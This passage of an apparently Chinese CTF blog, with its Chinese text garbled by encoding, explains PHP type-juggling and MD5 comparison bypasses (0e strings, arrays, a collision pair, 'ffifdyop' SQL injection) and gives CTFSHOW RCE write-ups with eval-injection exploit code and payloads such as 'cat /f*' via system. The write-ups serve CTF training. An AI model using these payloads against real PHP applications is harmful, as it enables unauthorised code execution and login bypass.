·ï¼Œåœ¨æ•°ç»„ä¸­æŸ¥æ‰¾ä¸€ä¸ªé”®å€¼ã€‚å¦‚æœæ‰¾åˆ°äº†è¯¥å€¼ï¼ŒåŒ¹é…å…ƒç´ çš„é”®åä¼šè¢«è¿”å›ã€‚å¦‚æœæ²¡æ‰¾åˆ°ï¼Œåˆ™è¿”å›falseã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;4admin&quot;</span>,<span class="variable">$a</span>)); <span class="comment">// int(0)=&gt; è¿”å›é”®å€¼1</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;1admin&quot;</span>,<span class="variable">$a</span>)); <span class="comment">// int(1) ==&gt;è¿”å›é”®å€¼0</span></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//è¿™ä¸ªå’Œä¹‹å‰çš„ç±»å‹è½¬æ¢ç±»ä¼¼ï¼Œä½†æ˜¯å¦‚æœæ˜¯array_search(â€œ4adminâ€,$a,true),æœ€åçš„â€œtrueâ€ä¼šç¦æ­¢ç±»å‹è½¬æ¢ã€‚</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå’Œä¹‹å‰çš„ç±»å‹è½¬æ¢ç±»ä¼¼ï¼Œä½†æ˜¯å¦‚æœæ˜¯array_search(â€œ4adminâ€,$a,true),æœ€åçš„â€œtrueâ€ä¼šç¦æ­¢ç±»å‹è½¬æ¢ã€‚</p><h1 id="md5å¸¸è§é—®é¢˜åŠç»•è¿‡"><a href="#md5å¸¸è§é—®é¢˜åŠç»•è¿‡" class="headerlink" title="md5å¸¸è§é—®é¢˜åŠç»•è¿‡"></a>md5å¸¸è§é—®é¢˜åŠç»•è¿‡</h1><p>åœ¨CTFä¸­ç»å¸¸ç¢°è§md5ç›¸å…³é¢˜ç›®ï¼Œæœ‰çš„æ˜¯å•ç‹¬ä¸€é“ï¼Œæ›´å¤šçš„æ˜¯ä½œä¸ºå…¶ä»–é¢˜ç›®çš„ä¸€ä¸ªç‚¹ã€‚è¿™é‡Œæ•´ç†ä¸€ä¸‹md5ç›¸å…³çŸ¥è¯†ï¼Œå¹¶ç»™å‡ºæ¶‰åŠç›¸å…³ç‚¹çš„é¢˜ç›®ã€‚</p><h2 id="md5çˆ†ç ´"><a href="#md5çˆ†ç ´" class="headerlink" title="md5çˆ†ç ´"></a>md5çˆ†ç ´</h2><p><code>substr(md5(captcha), -6, 6) == &quot;5bcba3&quot;</code><br>ç»™å‡ºmd5åŠ å¯†åçš„å‡ ä½ï¼Œå¯ä»¥è¿›è¡Œçˆ†ç ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">10000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>),-<span class="number">6</span>,<span class="number">6</span>)==<span class="string">&quot;5bcba3&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=c11750b8-161e-11ed-abf3-fa163e4fa609&amp;task_category_id=3">åŠŸé˜²ä¸–ç•Œ-SSRF Me</a><br>è¿™æ˜¯æ¶‰åŠåˆ°è¯¥çŸ¥è¯†ç‚¹çš„é¢˜ç›®</p><h2 id="md5å¼±æ¯”è¾ƒ"><a href="#md5å¼±æ¯”è¾ƒ" class="headerlink" title="md5å¼±æ¯”è¾ƒ"></a>md5å¼±æ¯”è¾ƒ</h2><p>md5å¼±æ¯”è¾ƒå½¢å¼ï¼š<br><code>if($a != $b &amp;&amp; md5($a) == md5($b))</code><br>è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•</p><ul><li>0eç»•è¿‡</li><li>æ•°ç»„ç»•è¿‡</li></ul><p>0eç»•è¿‡ï¼šæ˜¯md5åŠ å¯†åæ˜¯0exxxxxçš„å½¢å¼ï¼Œåœ¨==å¼±æ¯”è¾ƒæ—¶ï¼Œä¼šè¢«å½“åšç§‘å­¦æŠ€æœ¯æ³•ï¼Œä¼—æ‰€å‘¨çŸ¥ï¼Œ0çš„ä»»ä½•æ¬¡æ–¹éƒ½æ˜¯0ï¼Œè‡ªç„¶åˆ¤æ–­ä¸ºtrue<br>å¤§ä½¬æ•´ç†çš„<a href="https://github.com/spaze/hashes/blob/master/md5.md">md5åŠ å¯†å0eå¼€å¤´</a></p><p>æ•°ç»„ç»•è¿‡ï¼ša[]=a&amp;b[]=bï¼Œä¼ å…¥å‚æ•°ä¸ºæ•°ç»„åˆ™MD5è¿”å›NULLï¼Œnull=nullï¼Œåˆ¤æ–­ä¸ºtrueï¼ŒæˆåŠŸç»•è¿‡</p><h2 id="md5å¼ºæ¯”è¾ƒ"><a href="#md5å¼ºæ¯”è¾ƒ" class="headerlink" title="md5å¼ºæ¯”è¾ƒ"></a>md5å¼ºæ¯”è¾ƒ</h2><p>md5å¼ºæ¯”è¾ƒå½¢å¼ï¼š<br><code>if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;]))</code><br>0eç»•è¿‡ä¸èƒ½ç”¨äº†ï¼Œå› ä¸ºå¼ºæ¯”è¾ƒæ—¶ï¼Œ0exxxä¸å†è¢«å½“åšç§‘å­¦è®¡æ•°æ³•ï¼Œè€Œæ˜¯è¢«å½“åšå­—ç¬¦ä¸²ã€‚<br>æ•°ç»„ç»•è¿‡ä»ç„¶å¯ä»¥ã€‚</p><h2 id="md5å¼ºç¢°æ’"><a href="#md5å¼ºç¢°æ’" class="headerlink" title="md5å¼ºç¢°æ’"></a>md5å¼ºç¢°æ’</h2><p>md5å¼ºç¢°æ’å½¢å¼ï¼š<br><code>if((string)$_POST[&#39;a&#39;]!==(string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;])===md5($_POST[&#39;b&#39;]))</code><br>åˆ°å¼ºç¢°æ’è¿™é‡Œï¼Œå®ƒç”¨stringå¼ºè¡Œè½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œä»è€Œé™åˆ¶äº†æ•°ç»„ç»•è¿‡è¿™æ–¹æ³•ï¼Œåªèƒ½è¾“å…¥å­—ç¬¦ä¸²<br>å…ˆä¸Špayloadï¼š</p><blockquote><p>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<br>b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p></blockquote><p>è¿™ä¸€å¤§é•¿ä¸²çš„ç¼–ç ï¼Œä»–ä»¬çš„md5å€¼æ˜¯ç›¸ç­‰çš„ï¼ŒåŸç†æ˜¯å°†hexå­—ç¬¦ä¸²è½¬åŒ–ä¸ºasciiå­—ç¬¦ä¸²ï¼Œå¹¶å†™å…¥åˆ°binæ–‡ä»¶</p><p>è€ƒè™‘åˆ°è¦å°†ä¸€äº›ä¸å¯è§å­—ç¬¦ä¼ åˆ°æœåŠ¡å™¨ï¼Œè¿™é‡Œä½¿ç”¨urlç¼–ç </p><p><strong>è¿™ä¸ªæ˜¯å°†hexå†™å…¥åˆ°binæ–‡ä»¶çš„pythonè„šæœ¬æºç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line">hexString1 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;</span></span><br><span class="line">hexString2 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;</span></span><br><span class="line"></span><br><span class="line">hexList1 = []</span><br><span class="line">intList1 = []</span><br><span class="line">asciiString1 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString1 = hexString1[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString1 = hexString1[<span class="number">2</span>:]</span><br><span class="line">    hexList1.append(intString1)</span><br><span class="line">    <span class="keyword">if</span> (hexString1 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList1:</span><br><span class="line">    intList1.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList1:</span><br><span class="line">    asciiString1 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;1.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString1)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">hexList2 = []</span><br><span class="line">intList2 = []</span><br><span class="line">asciiString2 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString2 = hexString2[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString2 = hexString2[<span class="number">2</span>:]</span><br><span class="line">    hexList2.append(intString2)</span><br><span class="line">    <span class="keyword">if</span> (hexString2 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList2:</span><br><span class="line">    intList2.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList2:</span><br><span class="line">    asciiString2 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;2.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString2)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><strong>è¿™ä¸ªæ˜¯å°†binæ–‡ä»¶å†…å®¹å†æ¬¡urlç¼–ç çš„pythonè„šæœ¬æºç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"></span><br><span class="line">urlString1=<span class="string">&#x27;&#x27;</span></span><br><span class="line">urlString2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;1.bin&#x27;</span>):</span><br><span class="line">    urlString1 +=  urllib.quote(line)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;2.bin&#x27;</span>):</span><br><span class="line">    urlString2 +=  urllib.quote(line)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> urlString1</span><br><span class="line"><span class="built_in">print</span> urlString2</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/EC_Carrot/article/details/109525162">md5å¼ºç¢°æ’</a><br><a href="https://buuoj.cn/challenges#[å®‰æ´µæ¯ 2019]easy_web">buu-easy_web</a></p><h2 id="åŠ å¯†åå¼±ç›¸ç­‰"><a href="#åŠ å¯†åå¼±ç›¸ç­‰" class="headerlink" title="åŠ å¯†åå¼±ç›¸ç­‰"></a>åŠ å¯†åå¼±ç›¸ç­‰</h2><p>å½¢å¼å¦‚ä¸‹ï¼š<br><code>if ($md5==md5($md5))</code><br>å¯ä»¥æ‰¾0eå¼€å¤´å¹¶ä¸”md5åä»ç„¶0eå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œè¿™æ ·0==0,å°±å¯ä»¥ç»•è¿‡äº†ã€‚<br>è¿™é‡Œå¯ä»¥ç”¨0e215962017ã€‚<br><a href="https://buuoj.cn/challenges#[WUSTCTF2020]æœ´å®æ— å">buu-æœ´å®æ— å</a></p><h2 id="ffifdyopâ€”â€”ç»•è¿‡ä¸­ä¸€ä¸ªå¥‡å¦™çš„å­—ç¬¦ä¸²"><a href="#ffifdyopâ€”â€”ç»•è¿‡ä¸­ä¸€ä¸ªå¥‡å¦™çš„å­—ç¬¦ä¸²" class="headerlink" title="ffifdyopâ€”â€”ç»•è¿‡ä¸­ä¸€ä¸ªå¥‡å¦™çš„å­—ç¬¦ä¸²."></a>ffifdyopâ€”â€”ç»•è¿‡ä¸­ä¸€ä¸ªå¥‡å¦™çš„å­—ç¬¦ä¸².</h2><p><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></p><p><code>ffifdyop</code> è¿™ä¸ªå­—ç¬¦ä¸²è¢« md5 å“ˆå¸Œäº†åŠ å¯†åå˜æˆ ï¼š276f722736c95d99e921722cf9ed621c</p><p> Mysql åˆšå¥½åˆä¼šæŠŠ hex è½¬æˆ ascii è§£é‡Šï¼šâ€™orâ€™6&lt;ä¹±ç &gt; å³  <code>&#39;or&#39;66ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b</code></p><p> è€Œå› æ­¤æ‹¼æ¥ä¹‹åçš„å½¢å¼æ˜¯select * from admin where password=â€™â€™orâ€™6&lt;ä¹±ç &gt;â€™</p><p>å°±ç›¸å½“äºselect * from admin where password=â€™â€™or 1 å®ç°sqlæ³¨å…¥<br><a href="https://buuoj.cn/challenges#[BJDCTF2020]Easy MD5">Easy MD5</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wb </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW RCEæé™å¤§æŒ‘æˆ˜</title>
      <link href="/posts/fa99.html"/>
      <url>/posts/fa99.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTFSHOW-RCEæé™æŒ‘æˆ˜"><a href="#CTFSHOW-RCEæé™æŒ‘æˆ˜" class="headerlink" title="CTFSHOW RCEæé™æŒ‘æˆ˜"></a>CTFSHOW RCEæé™æŒ‘æˆ˜</h1><h2 id="RCEæŒ‘æˆ˜1"><a href="#RCEæŒ‘æˆ˜1" class="headerlink" title="RCEæŒ‘æˆ˜1"></a>RCEæŒ‘æˆ˜1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;æ‹¬å·&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;ç‚¹&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†â€™(â€˜å’Œâ€™.â€™ï¼Œæ²¡è¿‡æ»¤åå¼•å·ï¼Œå†…è”ç»•è¿‡ã€‚</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=echo `cat /f*`;</span><br></pre></td></tr></table></figure><h2 id="RCEæŒ‘æˆ˜2"><a href="#RCEæŒ‘æˆ˜2" class="headerlink" title="RCEæŒ‘æˆ˜2"></a>RCEæŒ‘æˆ˜2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶Y4tackerä½¬åœ¨åƒç“œæ¯æŠ•ç¨¿çš„shellmeæ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è‡ªå¢ç»•è¿‡ã€‚</p><blockquote><p>fuzzåå‘ç°å¯ç”¨çš„å¯è§å­—ç¬¦æœ‰ï¼š</p><p>! $ â€˜ ( ) + , . / ; = [ ] _</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>.<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;;&#x27;</span>];</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;</span><br><span class="line">(<span class="variable">$$__</span>[<span class="string">&#x27;_&#x27;</span>])(<span class="variable">$$__</span>[<span class="string">&#x27;__&#x27;</span>]);<span class="comment">//($_GET[&#x27;_&#x27;])($_GET[&#x27;__&#x27;])</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?_=system&amp;__=cat /f*</span><br><span class="line">ctf_show=%24_%3D%5B%5D%3B%24_%20%3D%20&#x27;&#x27;.%24_%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%3B&#x27;%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_.%24__%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D&#x27;_&#x27;.%24__.%24_%3B(%24%24__%5B&#x27;_&#x27;%5D)(%24%24__%5B&#x27;__&#x27;%5D)%3B</span><br></pre></td></tr></table></figure><h2 id="RCEæŒ‘æˆ˜3"><a href="#RCEæŒ‘æˆ˜3" class="headerlink" title="RCEæŒ‘æˆ˜3"></a>RCEæŒ‘æˆ˜3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶Y4tackerä½¬åœ¨åƒç“œæ¯æŠ•ç¨¿çš„shellmeæ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>fuzzåå‘ç°å¯ç”¨çš„å¯è§å­—ç¬¦æœ‰ï¼š</p><p>$ ( ) + , . / 0 1 ; = [ ] _  </p><p>å¹¶ä¸”ä»£ç é•¿åº¦é™åˆ¶è¦å°äº105ã€‚</p></blockquote><p>å¯ä»¥ç”¨æ•°å­—0æˆ–è€…1ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡(0/0)æ¥æ„é€ floatå‹çš„NANï¼Œ(1/0)æ¥æ„é€ floatå‹çš„INFï¼Œç„¶åè½¬æ¢æˆå­—ç¬¦ä¸²å‹ï¼Œå¾—åˆ°â€NANâ€å’Œâ€INFâ€ä¸­çš„å­—ç¬¦äº†ï¼Œ</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=((<span class="number">0</span>/<span class="number">0</span>)._)[<span class="number">0</span>]; <span class="comment">//è¿™é‡Œæ˜¯å…³é”®ï¼Œphpçš„è®¡ç®—ä¸Šé¢æœ‰è¯´ï¼Œè¿”å›N</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++; </span><br><span class="line"><span class="comment">//è¿™é‡Œæ˜¯è¿›è¡Œäº†++çš„ï¼Œæ‰€ä»¥$_ç­‰äºP, $__=POã€‚</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// Q</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$_</span>.++<span class="variable">$_</span>; <span 